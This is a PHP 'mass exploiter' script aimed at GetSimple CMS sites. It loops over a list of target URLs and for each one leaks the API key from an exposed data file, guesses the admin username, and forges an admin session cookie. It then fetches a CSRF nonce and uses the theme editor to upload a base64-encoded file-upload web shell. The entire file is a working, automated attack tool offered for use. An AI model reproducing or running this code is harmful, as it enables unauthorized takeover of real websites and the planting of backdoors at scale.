<?php
/**
* @author Con7ext <kreonrinto@gmail.com>
* GetSimpleCMS Mass Exploiter
* php file.php list.txt
**/
class getCMS{
  public $url;
  public $user;
  public $cookie;
  public $headers;
  public $apikey;
  public $version;
  public $shell;
  public $payload;
  public function __construct($url){
    $this->url = $url;
    $this->user = null;
    $this->cookie = null;
    $this->apikey = null;
    $this->version = null;
    $this->headers = null;
    $this->shell = "rintods.php";
    $this->payload = base64_decode("PD9waHAgDQppZihpc3NldCgkX0ZJTEVTWydyaW50b2QnXVsnbmFtZSddKSl7DQogICRuYW1lID0gJF9GSUxFU1sncmludG9kJ11bJ25hbWUnXTsNCiAgJG50b2QgPSAkX0ZJTEVTWydyaW50b2QnXVsndG1wX25hbWUnXTsNCiAgQG1vdmVfdXBsb2FkZWRfZmlsZSgkbnRvZCwgJG5hbWUpOw0KICBlY2hvICRuYW1lOw0KfWVsc2V7DQogIGVjaG8gIjxmb3JtIG1ldGhvZD1wb3N0IGVuY3R5cGU9bXVsdGlwYXJ0L2Zvcm0tZGF0YT48aW5wdXQgdHlwZT1maWxlIG5hbWU9cmludG9kPjxpbnB1dCB0eXBlPXN1Ym1pdCB2YWx1ZT1VcGxvYWQ+IjsNCn0gDQo/Pg==");
  }
  public function makeRequest($url, $post = null, $header = null){
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_MAXREDIRS, 10);
    if($header && !empty($header)){
      curl_setopt($ch, CURLOPT_HTTPHEADER, $header);
    }
    if($post && !empty($post)){
      curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
    }
    $re = curl_exec($ch);
    $http = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    return [
      "head" => $http,
      "body" => $re
    ];
  }
  public function genHeader(){
    $this->headers = array("Cookie: ".$this->cookie);
  }
  public function genCookie(){
    $this->cookie = "GS_ADMIN_USERNAME=".$this->user.";".$this->CookieName()."=".$this->CookieValue();
    $this->genHeader();
  }
  public function CookieName(){
    $cname = "getsimple_cookie_".$this->version.$this->apikey;
    $sh = sha1($cname);
    return $sh;
  }
  public function CookieValue(){
    $cvalue = $this->user.$this->apikey;
    $sh = sha1($cvalue);
    return $sh;
  }
  public function version(){
    $meh = $this->makeRequest($this->url."/admin");
    preg_match_all("|src=\"template/js/jquery.getsimple.js\?v=(.*?)\">|", $meh["body"], $vers);
    if(!empty($vers[1][0])){
      $this->version = str_replace(".", "", $vers[1][0]);
      return true;
    }
    else{
      echo "\033[0;31mI can't find Version ;D\n";
      return false;
    }
  }
  public function getApikey(){
    $meh = $this->makeRequest($this->url."/data/other/authorization.xml");
    preg_match_all("|<apikey><\!\[CDATA\[(.*?)\]\]></apikey>|", $meh["body"], $vers);
    if(!empty($vers[1][0])){
      $this->apikey = $vers[1][0];
      return true;
    }
    else{
      echo "\033[0;31mI can't get apikey :D\n";
      return false;
    }
  }
  public function getUser(){
    $meh = $this->makeRequest($this->url."/data/users/");
    if($meh["head"] == 200){
      preg_match_all("|<a href=\"(.*?).xml\">|", $meh["body"], $vers);
      if(!empty($vers[1][0])){
        $this->user = $vers[1][0];
        return true;
      }
      else{
        $this->user = "admin";
        return true;
      }
    }
    else{
      $this->user = "admin";
    }
  }
  public function getNonce(){
    $req = $this->makeRequest($this->url."/admin/theme-edit.php", null, $this->headers);
    preg_match_all("|nonce\" type=\"hidden\" value=\"(.*)\"|", $req["body"], $vers);
    if(!empty($vers[1][0])){
     return $vers[1][0];
    }
    else{
      echo "\033[0;31mi can't find nonce :D\n";
    }
  }
  public function upload(){
    $n = $this->getNonce();
    $data = array(
      "submitsave" => "2",
      "edited_file" => $this->shell,
      "content" => $this->payload,
      "nonce" => $n);
    $req = $this->makeRequest($this->url."/admin/theme-edit.php", $data, $this->headers);
    if(!preg_match("|CSRF detected|", $req["body"])){
      echo "\033[0;32mSuccess -> ".$this->url."/theme/".$this->shell."\n";
    }
    else{
      echo "\033[0;31mFailed\n";
    }
  }
  public function exploit(){
    echo "\n\033[1;37m[+] ".$this->url." [+]\n";
    echo "\033[0;34m[+]Getting Version\n";
    if($this->version()){
      echo "[+]\033[0;34mGetting Apikey\n";
      if($this->getApikey()){
        echo "[+]\033[0;34mGetting User\n";
        if($this->getUser()){
          $this->genCookie();
          echo "[+]\033[0;34mUploading Shell\n";
          $this->upload();
        }
      }
    }
  }
}
$list = $argv[1];
$mek = file_get_contents($list);
$mes = explode("\n", $mek);
foreach($mes as $site){
  $t = new getCMS($site);
  $t->exploit();
}
echo "\033[1;37m";
